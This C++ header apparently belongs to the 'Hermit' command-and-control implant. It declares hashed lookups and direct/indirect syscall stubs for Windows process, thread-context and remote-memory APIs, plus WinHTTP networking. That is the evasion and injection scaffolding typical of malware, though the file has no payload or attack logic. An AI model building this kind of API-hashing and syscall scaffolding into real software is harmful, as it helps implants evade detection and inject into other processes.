#ifndef HERMIT_CORE_PROCS_HPP
#define HERMIT_CORE_PROCS_HPP

#include "core/ntdll.hpp"
#include "core/stdout.hpp"
#include "core/syscalls.hpp"

#include <winternl.h>
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <cstring>

#define APIHASH_NTCREATEPROCESSEX           0xbd003d8b
#define APIHASH_NTOPENPROCESS               0x64e24f6a
#define APIHASH_NTOPENPROCESSTOKEN          0xcdd9f7af
#define APIHASH_NTTERMINATEPROCESS          0xc58a7b49
#define APIHASH_NTQUERYINFORMATIONPROCESS   0xa79c59b0
#define APIHASH_NTSETINFORMATIONPROCESS     0xb5d02d0a
#define APIHASH_NTCREATETHREADEX            0x2afc9934
#define APIHASH_NTOPENTHREAD                0xa58f60af
#define APIHASH_NTRESUMETHREAD              0x8bad8d92
#define APIHASH_NTGETCONTEXTTHREAD          0x904d345e
#define APIHASH_NTSETCONTEXTTHREAD          0x25df9cd2
#define APIHASH_NTALLOCATEVIRTUALMEMORY     0xf8829394
#define APIHASH_NTREADVIRTUALMEMORY         0x88bc3b5b
#define APIHASH_NTWRITEVIRTUALMEMORY        0x7c61e008
#define APIHASH_NTPROTECTVIRTUALMEMORY      0xa7df2bd8
#define APIHASH_NTFREEVIRTUALMEMORY         0xb6eb4645
#define APIHASH_NTDUPLICATEOBJECT           0xae23334f
#define APIHASH_NTWAITFORSINGLEOBJECT       0x73c87a00
#define APIHASH_NTCLOSE                     0x6f18e5dd
#define APIHASH_NTCREATEFILE                0x2f4d94d3
#define APIHASH_NTREADFILE                  0xc363b2ad
#define APIHASH_NTWRITEFILE                 0x9339e2e0
#define APIHASH_NTCREATENAMEDPIPEFILE       0x333974ac
#define APIHASH_NTQUERYINFORMATIONFILE      0x6226c85b
#define APIHASH_NTSETINFORMATIONFILE        0x52a8041
#define APIHASH_NTUNMAPVIEWOFSECTION        0x574e9fc1
#define APIHASH_RTLALLOCATEHEAP             0xcc7755e
#define APIHASH_RTLZEROMEMORY               0x899c0d1e
#define APIHASH_RTLINITUNICODESTRING        0x4dc9caa9
#define APIHASH_RTLSTRINGCCHCATW            0x2deef223
#define APIHASH_RTLSTRINGCCHCOPYW           0x32231e60
#define APIHASH_RTLSTRINGCCHLENGTHW         0x28821d8f
#define APIHASH_RTLQUERYSYSTEMINFORMATION   0xf6044a6a
#define APIHASH_RTLEXPANDENVIRONMENTSTRINGS 0xb73f443e
#define APIHASH_RTLGETFULLPATHNAME_U        0x2116c216
#define APIHASH_CREATETHREADPOOLWAIT        0x7a8370ac
#define APIHASH_SETTHREADPOOLWAIT           0x5f2a3808
#define APIHASH_WINHTTPOPEN                 0x97451379
#define APIHASH_WINHTTPCONNECT              0xe18b30db
#define APIHASH_WINHTTPOPENREQUEST          0xd6cffcd6
#define APIHASH_WINHTTPSETOPTION            0x48ed79a8
#define APIHASH_WINHTTPSENDREQUEST          0x79792358
#define APIHASH_WINHTTPWRITEDATA            0xeed55fda
#define APIHASH_WINHTTPRECEIVERESPONSE      0x66131eb5
#define APIHASH_WINHTTPQUERYHEADERS         0xe17c65cd
#define APIHASH_WINHTTPQUERYDATAAVAILABLE   0xff301fc6
#define APIHASH_WINHTTPREADDATA             0x70389c8f
#define APIHASH_WINHTTPCLOSEHANDLE          0x22081731

#define HASH_IV     0x35
#define RANDOM_ADDR 0xab10f29f

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

namespace Procs
{
    // **NATIVE APIs**
    // NtCreateProcessEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEPROCESSEX)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle, ULONG Reserved);
    // NtOpenProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
    // NtOpenProcessToken
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESSTOKEN)( HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
    // NtTerminateProcess
	typedef NTSTATUS (NTAPI* LPPROC_NTTERMINATEPROCESS)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
    // NtQueryInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    // NtSetInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONPROCESS)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
    // NtCreateThreadEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
    // NtOpenThread
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENTHREAD)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
    // NtResumeThread
    typedef NTSTATUS (NTAPI* LPPROC_NTRESUMETHREAD)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    // NtGetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTGETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtSetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTSETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtAllocateVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTALLOCATEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    // NtReadVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTREADVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
    // NtWriteVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    // NtProtectVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTPROTECTVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    // NtFreeVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTFREEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    // NtDuplicateObject
    typedef NTSTATUS (NTAPI* LPPROC_NTDUPLICATEOBJECT)(HANDLE SourceProcessHandle, PHANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, BOOLEAN InheritHandle, ULONG Options);
    // NtWaitForSingleObject
    typedef NTSTATUS (NTAPI* LPPROC_NTWAITFORSINGLEOBJECT)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    // NtClose
	typedef NTSTATUS (NTAPI* LPPROC_NTCLOSE)(HANDLE Handle);
    // NtCreateFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEFILE)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
    // NtReadFile
    typedef NTSTATUS (NTAPI* LPPROC_NTREADFILE)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtWriteFile
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEFILE)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtCreateNamedPipeFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATENAMEDPIPEFILE)(PHANDLE FileHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout);
    // NtQueryInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONFILE)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
    // NtSetInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONFILE)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
    // NtUnmapViewOfSection
    typedef NTSTATUS (NTAPI* LPPROC_NTUNMAPVIEWOFSECTION)(HANDLE ProcessHandle, PVOID BaseAddress);

    // **NATIVE APIs (Runtime Library)**
    // RtlAllocateHeap
    typedef PVOID (NTAPI* LPPROC_RTLALLOCATEHEAP)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    // RtlZeroMemory
    typedef VOID (NTAPI* LPPROC_RTLZEROMEMORY)(PVOID Destination, SIZE_T Length);
    // RtlInitUnicodeString
    typedef NTSTATUS (NTAPI* LPPROC_RTLINITUNICODESTRING)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
    // RtlStringCchCatW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCATW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchCopyW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCOPYW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchLengthW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHLENGTHW)(PCWSTR psz, SIZE_T cchMax, SIZE_T *pcchLength);
    // RtlQuerySystemInformation
    typedef NTSTATUS (NTAPI* LPPROC_RTLQUERYSYSTEMINFORMATION)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    // RtlExpandEnvironmentStrings
    typedef NTSTATUS (NTAPI* LPPROC_RTLEXPANDENVIRONMENTSTRINGS)(PVOID Environment, PCWSTR Source, SIZE_T SourceLength, PWSTR Destination, SIZE_T DestinationLength, PSIZE_T ReturnLength);
    // RtlNtStatusToDosError
    typedef DWORD (NTAPI* LPPROC_RTLNTSTATUSTODOSERROR)(NTSTATUS Status);
    // RtlGetFullPathName_U
    typedef NTSTATUS (NTAPI* LPPROC_RTLGETFULLPATHNAME_U)(PCWSTR FileName, ULONG BufferLength, PWSTR Buffer, PWSTR *FilePart);

    // **WINAPIs**
    // CreateThreadpoolWait
    typedef PTP_WAIT    (WINAPI* LPPROC_CREATETHREADPOOLWAIT)(PTP_WAIT_CALLBACK pfnwa, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
    // SetThreadpoolWait
    typedef VOID        (WINAPI* LPPROC_SETTHREADPOOLWAIT)(PTP_WAIT pwa, HANDLE h, PFILETIME pftTimeout);
    // WinHttpOpen
    typedef HINTERNET   (WINAPI* LPPROC_WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
    // WinHttpConnect
    typedef HINTERNET   (WINAPI* LPPROC_WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
    // WinHttpOpenRequest
    typedef HINTERNET   (WINAPI* LPPROC_WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
    // WinHttpSetOption
    typedef BOOL        (WINAPI* LPPROC_WINHTTPSETOPTION)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
    // WinHttpSendRequest
    typedef BOOL        (WINAPI* LPPROC_WINHTTPSENDREQUEST)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
    // WinHttpWriteData
    typedef BOOL        (WINAPI* LPPROC_WINHTTPWRITEDATA)(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);
    // WinHttpReceiveResponse
    typedef BOOL        (WINAPI* LPPROC_WINHTTPRECEIVERESPONSE)(HINTERNET hRequest, LPVOID lpReserved);
    // WinHttpQueryHeaders
    typedef BOOL        (WINAPI* LPPROC_WINHTTPQUERYHEADERS)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
    // WinHttpQueryDataAvailable
    typedef BOOL        (WINAPI* LPPROC_WINHTTPQUERYDATAAVAILABLE)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
    // WinHttpReadData
    typedef BOOL        (WINAPI* LPPROC_WINHTTPREADDATA)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesLength, LPDWORD lpdwNumberOfBytesRead);
    // WinHttpCloseHandle
    typedef BOOL        (WINAPI* LPPROC_WINHTTPCLOSEHANDLE)(HINTERNET hInternet);

    struct PROCS
    {
        // **NATIVE APIs**
        LPPROC_NTCREATEPROCESSEX            lpNtCreateProcessEx                 = nullptr;
        LPPROC_NTOPENPROCESS                lpNtOpenProcess                     = nullptr;
        LPPROC_NTOPENPROCESSTOKEN           lpNtOpenProcessToken                = nullptr;
        LPPROC_NTTERMINATEPROCESS           lpNtTerminateProcess                = nullptr;
        LPPROC_NTQUERYINFORMATIONPROCESS    lpNtQueryInformationProcess         = nullptr;
        LPPROC_NTSETINFORMATIONPROCESS      lpNtSetInformationProcess           = nullptr;
        LPPROC_NTCREATETHREADEX             lpNtCreateThreadEx                  = nullptr;
        LPPROC_NTOPENTHREAD                 lpNtOpenThread                      = nullptr;
        LPPROC_NTRESUMETHREAD               lpNtResumeThread                    = nullptr;
        LPPROC_NTGETCONTEXTTHREAD           lpNtGetContextThread                = nullptr;
        LPPROC_NTSETCONTEXTTHREAD           lpNtSetContextThread                = nullptr;
        LPPROC_NTALLOCATEVIRTUALMEMORY      lpNtAllocateVirtualMemory           = nullptr;
        LPPROC_NTREADVIRTUALMEMORY          lpNtReadVirtualMemory               = nullptr;
        LPPROC_NTWRITEVIRTUALMEMORY         lpNtWriteVirtualMemory              = nullptr;
        LPPROC_NTPROTECTVIRTUALMEMORY       lpNtProtectVirtualMemory            = nullptr;
        LPPROC_NTFREEVIRTUALMEMORY          lpNtFreeVirtualMemory               = nullptr;
        LPPROC_NTDUPLICATEOBJECT            lpNtDuplicateObject                 = nullptr;
        LPPROC_NTWAITFORSINGLEOBJECT        lpNtWaitForSingleObject             = nullptr;
        LPPROC_NTCLOSE                      lpNtClose                           = nullptr;
        LPPROC_NTCREATEFILE                 lpNtCreateFile                      = nullptr;
        LPPROC_NTREADFILE                   lpNtReadFile                        = nullptr;
        LPPROC_NTWRITEFILE                  lpNtWriteFile                       = nullptr;
        LPPROC_NTCREATENAMEDPIPEFILE        lpNtCreateNamedPipeFile             = nullptr;
        LPPROC_NTQUERYINFORMATIONFILE       lpNtQueryInformationFile            = nullptr;
        LPPROC_NTSETINFORMATIONFILE         lpNtSetInformationFile              = nullptr;
        LPPROC_NTUNMAPVIEWOFSECTION         lpNtUnmapViewOfSection              = nullptr;

        // **NATIVE APIs (RUNTIME LIBRARY)**
        LPPROC_RTLALLOCATEHEAP              lpRtlAllocateHeap                   = nullptr;
        LPPROC_RTLZEROMEMORY                lpRtlZeroMemory                     = nullptr;
        LPPROC_RTLINITUNICODESTRING         lpRtlInitUnicodeString              = nullptr;
        LPPROC_RTLSTRINGCCHCATW             lpRtlStringCchCatW                  = nullptr;
        LPPROC_RTLSTRINGCCHCOPYW            lpRtlStringCchCopyW                 = nullptr;
        LPPROC_RTLSTRINGCCHLENGTHW          lpRtlStringCchLengthW               = nullptr;
        LPPROC_RTLQUERYSYSTEMINFORMATION    lpRtlQuerySystemInformation         = nullptr;
        LPPROC_RTLEXPANDENVIRONMENTSTRINGS  lpRtlExpandEnvironmentStrings       = nullptr;
        LPPROC_RTLGETFULLPATHNAME_U         lpRtlGetFullPathName_U              = nullptr;

        // **WINAPIs**
        LPPROC_CREATETHREADPOOLWAIT         lpCreateThreadpoolWait              = nullptr;
        LPPROC_SETTHREADPOOLWAIT            lpSetThreadpoolWait                 = nullptr;
        LPPROC_WINHTTPOPEN                  lpWinHttpOpen                       = nullptr;
        LPPROC_WINHTTPCONNECT               lpWinHttpConnect                    = nullptr;
        LPPROC_WINHTTPOPENREQUEST           lpWinHttpOpenRequest                = nullptr;
        LPPROC_WINHTTPSETOPTION             lpWinHttpSetOption                  = nullptr;
        LPPROC_WINHTTPSENDREQUEST           lpWinHttpSendRequest                = nullptr;
        LPPROC_WINHTTPWRITEDATA             lpWinHttpWriteData                  = nullptr;
        LPPROC_WINHTTPRECEIVERESPONSE       lpWinHttpReceiveResponse            = nullptr;
        LPPROC_WINHTTPQUERYHEADERS          lpWinHttpQueryHeaders               = nullptr;
        LPPROC_WINHTTPQUERYDATAAVAILABLE    lpWinHttpQueryDataAvailable         = nullptr;
        LPPROC_WINHTTPREADDATA              lpWinHttpReadData                   = nullptr;
        LPPROC_WINHTTPCLOSEHANDLE           lpWinHttpCloseHandle                = nullptr;

        // **SYSCALLS**
        Syscalls::SYSCALL                   sysNtCreateProcessEx                = {0};
        Syscalls::SYSCALL                   sysNtOpenProcess                    = {0};
        Syscalls::SYSCALL                   sysNtOpenProcessToken               = {0};
        Syscalls::SYSCALL                   sysNtTerminateProcess               = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationProcess        = {0};
        Syscalls::SYSCALL                   sysNtSetInformationProcess          = {0};
        Syscalls::SYSCALL                   sysNtCreateThreadEx                 = {0};
        Syscalls::SYSCALL                   sysNtOpenThread                     = {0};
        Syscalls::SYSCALL                   sysNtResumeThread                   = {0};
        Syscalls::SYSCALL                   sysNtGetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtSetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtAllocateVirtualMemory          = {0};
        Syscalls::SYSCALL                   sysNtReadVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtWriteVirtualMemory             = {0};
        Syscalls::SYSCALL                   sysNtProtectVirtualMemory           = {0};
        Syscalls::SYSCALL                   sysNtFreeVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtWaitForSingleObject            = {0};
        Syscalls::SYSCALL                   sysNtClose                          = {0};
        Syscalls::SYSCALL                   sysNtCreateFile                     = {0};
        Syscalls::SYSCALL                   sysNtReadFile                       = {0};
        Syscalls::SYSCALL                   sysNtWriteFile                      = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationFile           = {0};
        Syscalls::SYSCALL                   sysNtUnmapViewOfSection             = {0};
        
        Syscalls::SYSCALL                   sysRtlInitUnicodeString             = {0};
        Syscalls::SYSCALL                   sysRtlGetFullPathName_U             = {0};
    };

    typedef PROCS* PPROCS;

    DWORD GetHashFromString(char* str);
    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    );
    PPROCS FindProcs(
        HMODULE hNTDLL,
        HMODULE hKernel32DLL,
        HMODULE hWinHTTPDLL,
        BOOL    bIndirectSyscalls
    );
}

#endif // HERMIT_CORE_PROCS_HPP